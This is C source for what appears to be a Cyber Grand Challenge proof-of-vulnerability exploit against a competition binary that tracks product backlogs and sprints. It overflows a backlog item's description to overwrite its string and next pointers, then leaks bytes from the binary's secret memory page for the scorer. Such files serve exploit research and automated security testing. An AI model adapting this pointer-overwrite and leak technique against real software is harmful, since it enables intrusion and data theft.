/*

Author: Steve Wood <swood@cromulence.com>

Copyright (c) 2015 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/


#include "libcgc.h"

typedef struct {

	unsigned int flag;
	unsigned short len;
	unsigned short command;
	unsigned short id;

} baseCommandType;

typedef struct {

	unsigned int flag;
	unsigned short len;
	unsigned short command;
	unsigned short id;
	unsigned short blid;
	unsigned short points;
	char title[2];

} newPBLCommandType;

typedef struct {

	unsigned int flag;
	unsigned short len;
	unsigned short command;
	unsigned short id;
	unsigned short sid;
	char title[2];

} newSprintCommandType;


int cgc_receive_bytes (int fd, void *buffer, cgc_size_t count);
int cgc_write( int fd, void *buffer, cgc_size_t count );
void cgc_eat_line(int fd);

int main(int cgc_argc, char *cgc_argv[])
{


int pov_type;
unsigned int type2_addr=0x4347C000;
unsigned int type2_length;
unsigned int type2_size;
unsigned int new_offset_value;

unsigned int newStringPtr;
unsigned short leaked_value1;
unsigned short leaked_value2;

baseCommandType command;
newPBLCommandType command2;
newSprintCommandType command3;

int i;
char c;
char leaked_chars[4];
unsigned char byte;

	pov_type = 2;

	// safe area of the heap to cgc_read from to avoid segfaults
	newStringPtr = 0xb7fff012;

	if (cgc_write(3, &pov_type, sizeof(pov_type)) == -1)
		cgc__terminate(-1);


	if (cgc_receive_bytes(3, &type2_addr, sizeof(type2_addr)) == -1)
		cgc__terminate(-1);

	if (cgc_receive_bytes(3, &type2_size, sizeof(type2_size)) == -1)
		cgc__terminate(-1);

	if (cgc_receive_bytes(3, &type2_length, sizeof(type2_length)) == -1)
		cgc__terminate(-1);


	// first setup a new product
	command.flag = 0x12345678;
	command.len = 4;
	command.id = 1;
	command.command = 0x101;


	if (cgc_write(STDOUT, (void *)&command, sizeof(baseCommandType)-2) == -1)
		cgc__terminate(-1);

	if (cgc_write(STDOUT, "1", 2) == -1)
		cgc__terminate(-1);

    // now cgc_write an entry to the product backlog
	command2.flag = 0x12345678;
	command2.command = 0x102;
	command2.len = 8;
	command2.id = 1;
	command2.blid = 1;
	command2.points = 0;
	command2.title[0] = 'a';
	command2.title[1] = 0;


	if (cgc_write(STDOUT, (void *)&command2, sizeof(newPBLCommandType)) == -1)
		cgc__terminate(-1);

    // cgc_write a second entry to the product backlog
	command2.blid = 2;
	command2.title[0] = 'b';

	if (cgc_write(STDOUT, (void *)&command2, sizeof(newPBLCommandType)) == -1)
		cgc__terminate(-1);


    // create a sprint
	command3.flag = 0x12345678;
	command3.command = 0x103;
	command3.len = 6;
	command3.id = 1;
	command3.sid = 1;
	command3.title[0] = 'c';
	command3.title[1] = 0;

	if (cgc_write(STDOUT, (void *)&command3, 14) == -1)
		cgc__terminate(-1);



	// now move the first backlog entry to the sprint

	command2.command = 0x201;
	command2.points = 1;
	command2.blid = 1;

	if (cgc_write(STDOUT, (void *)&command2, sizeof(newPBLCommandType)) == -1)
		cgc__terminate(-1);


	// new edit the description, overwriting the second backlog entry
	unsigned char buffer[] = { 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 0x10, 0x01, 0x02, 0x03, 1, 1, 2, 1, 3, 1, 0xa, 0xb};

	command2.command = 0x503;
	command2.len = 34;

	if (cgc_write(STDOUT, (void *)&command2, sizeof(newPBLCommandType)-2) == -1)
		cgc__terminate(-1);

	if (cgc_write(STDOUT, (void *)buffer, 20) == -1)
		cgc__terminate(-1);	

	type2_addr += 2;

	// this will overwrite the pointer to the backlog item's description string
	if (cgc_write(STDOUT, (void *)&newStringPtr, sizeof(newStringPtr)) == -1)
		cgc__terminate(-1);

	// this will overwrite the bl item's next pointer.
	// Make it also point to the secret data area as a backup to the overwrite above, which will fail if the first 4 bytes contain a null
	if (cgc_write(STDOUT, (void *)&type2_addr, sizeof(type2_addr)) == -1)
		cgc__terminate(-1);


	// print out the product, leaking bytes from the magic page
	command.command = 0x301;

	command.id = 1;
	command.len = 4;

	if (cgc_write(STDOUT, (void *)&command, sizeof(baseCommandType)) == -1)
		cgc__terminate(-1);


	// discard the first 7 lines of output
	for (i = 0; i < 8; ++i)
		cgc_eat_line(STDIN);


	cgc_receive_bytes(STDIN, &c, 1);

	// this special case is put in to handle the POV being thrown against the patched binary
	// otherwise the POV will hang waiting for input that isn't coming
	if (c == 0x0a) {

		cgc_write(3, &leaked_value1, 4);
		cgc__terminate(-1);
	}

	for (i = 0; i < 1; ++i) {

		c = 0;

		while(c != 0x09) {
			cgc_receive_bytes(STDIN, &c, 1);

		}
	} //for

	leaked_value1 = 0;

	// first cgc_read an unsigned short that is now the item's ID
	while(1) {

		cgc_receive_bytes(STDIN, &byte, 1);

		if (byte == ':')
			break;

		leaked_value1 = (leaked_value1 * 10 ) + (byte - '0');

	}

	// consume the tab character
	cgc_receive_bytes(STDIN, &byte, 1);

	leaked_value2 = 0;

	// now cgc_read an unsigned short that is the items' total "points".
	while(1) {

		cgc_receive_bytes(STDIN, &byte, 1);

		if (byte == 0x0a)
			break;

		leaked_value2 = (leaked_value2 * 10 ) + (byte - '0');

	}

	// cgc_write the two leaked values to the server for validation.
	cgc_write(3, &leaked_value1, 2);
	cgc_write(3, &leaked_value2, 2);

  // now terminate the program
	command.command = 0xdead;
	command.len = 0;

	if (cgc_write(STDOUT, (void *)&command, sizeof(baseCommandType)) == -1)
		cgc__terminate(-1);

}



int cgc_receive_bytes (int fd, void *buffer, cgc_size_t count) 
{
cgc_size_t total;
cgc_size_t rxbytes;

    total = 0;

    while(total < count)  {

        rxbytes = 0;

        if (cgc_receive(fd, buffer+total, count-total, &rxbytes)==0 ) {

            total += rxbytes;

        }
        
        else {

            return(-1);
        }

    }

return 0;

}


int cgc_write( int fd, void *buffer, cgc_size_t count )
{
	cgc_size_t written;
    int total_written;
    int retval;

    written = 0;
    total_written = 0;

    while (total_written < count) {
	   retval=cgc_transmit(fd, buffer+total_written, count-total_written, &written);

       if (retval != 0)
            return(-1);

       total_written+=written;
    }


	return(count);

}

void cgc_eat_line(int fd)
{

	char c;

	c = 0;

	while(c != 0x0a) {
		cgc_receive(fd, &c, 1, 0);

	}


}


